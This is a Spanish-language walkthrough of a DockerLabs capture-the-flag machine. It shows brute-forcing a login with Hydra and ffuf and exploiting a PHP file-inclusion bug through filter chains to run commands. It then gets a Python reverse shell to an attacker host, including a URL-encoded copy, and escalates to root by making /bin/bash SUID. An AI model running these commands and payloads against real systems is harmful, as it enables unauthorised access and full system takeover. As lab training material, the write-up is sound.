## **Explotación**

A continuación, voy a ejecutar ataques de fuerza bruta sobre el panel login con usuarios comunes, y he acabado teniendo resultado con el usuario `administrator`.

- Ataque de fuerza bruta con **Hydra**.
	
	```bash
	hydra -l administrator -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form '/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.' -f -t 64 -I
	```
	
	![picture](/assets/images/dockerlabs/swiss9.png)

- Ataque de fuerza bruta con **FFUF**.
	
	```bash
	ffuf -c -u http://172.17.0.2/sobre-mi/login.php -X POST -d "username=administrator&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fr "Usuario o contraseña incorrectos."
	```
	
	![picture](/assets/images/dockerlabs/swiss10.png)

Accedemos en el panel "*Login*", y obtenemos unas credenciales de **SSH**.

## **Escalada de privilegios**

Dentro del directorio `/home` encontramos un archivo que nos indica que el servidor web tiene un fallo de seguridad.

![picture](/assets/images/dockerlabs/swiss17.png)

Intentando ejecutar archivos como `whoami`, moverme entre directorios, etc, veo que tengo muchos comandos restringidos mostrándome lo siguiente.

![picture](/assets/images/dockerlabs/swiss18.png)

Listando el contenido del archivo `/etc/passwd`, compruebo que el usuario **darks** tiene asignado como `shell` una **rbash**, es un tipo de `shell` con restricciones adicionales para limitar lo que un usuario puede hacer dentro del sistema.

```bash
darks:x:1001:1001::/home/darks:/bin/rbash
```

Viendo el contenido del archivo `index.php` de la web, compruebo que es vulnerable a `LFI` (*Local File Inclusion*) ya que el siguiente código no valida ni filtra el contenido del parámetro `file`, y con la función `include` se puede ejecutar un archivo.

```bash
cat /var/www/html/index.php
```

```php
<?php
  if (isset($_GET['file'])) {
  include($_GET['file']);
  }
 ?>
```

Si nos vamos al navegador, e incluimos el parámetro detrás de `index.php` podemos leer el archivo `/etc/passwd`.

![picture](/assets/images/dockerlabs/swiss19.png)

Viendo que no tenemos capacidad para ejecutar un `RCE` (*Remote Code Execution*), voy a utilizar `PHP Filter Chains` del siguiente repositorio de [Github](https://github.com/synacktiv/php_filter_chain_generator), para intentar ejecutar comandos en el servidor.

Los `PHP Filter Chains` permiten aplicar una serie de filtros a los datos de entrada mediante funciones, se pueden usar para validar, sanitizar y transformar los datos.

Para usar la herramienta simplemente con la variable `--chain` introducimos el código que queremos codificar.

Voy a codificar código **PHP** para obtener un `RCE` (*Remote Code Execution*).

```python
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

![picture](/assets/images/dockerlabs/swiss20.png)

Copiamos todo el código generado en el navegador después de `?file=`.

Introducimos el comando `whoami`, y podemos comprobar el output del comando al final de la web.

![picture](/assets/images/dockerlabs/swiss21.png)

![picture](/assets/images/dockerlabs/swiss22.png)

A continuación, vamos a obtener una `Reverse Shell` para poder ejecutar comandos en el servidor desde nuestra máquina local.

- Listener con `netcat`
	
	```bash
	nc -lnvp 4444
	```

- Reverse shell
	
	```python
	python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("172.17.10.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
	```
	
	Para que la **URL** pueda ejecutarlo necesitamos codificarlo en **URL**.
	
	```python
	python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22172.17.10.10%22%2C4444%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
	```

Lo ejecutamos en el navegador, y obtenemos la `Reverse shell`.

En el directorio personal, nos encontramos 3 archivos, el usuario `cristal` pertenece al grupo `editor`, con lo cual podemos modificar el archivo `systm.c`.

![picture](/assets/images/dockerlabs/swiss33.png)

Si comprobamos el script `systm.sh`, crea un bucle infinito compilando y ejecutando el programa `systm.c` cada 15 segundos.

```bash
var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```

Como tenemos permisos de escritura en el archivo `systm.c` vamos a modificarlo para poder ganar máximos privilegios.

Establecemos el bit `SUID` al binario `/bin/bash`.

```c
#include <stdlib.h>

int main() {
        system("chmod u+s /bin/bash");

        return 0;
}
```

Esperamos 15 segundos, y comprobamos los permisos de `/bin/bash`.

Y podemos ejecutar una ``bash`` como usuario `root`.
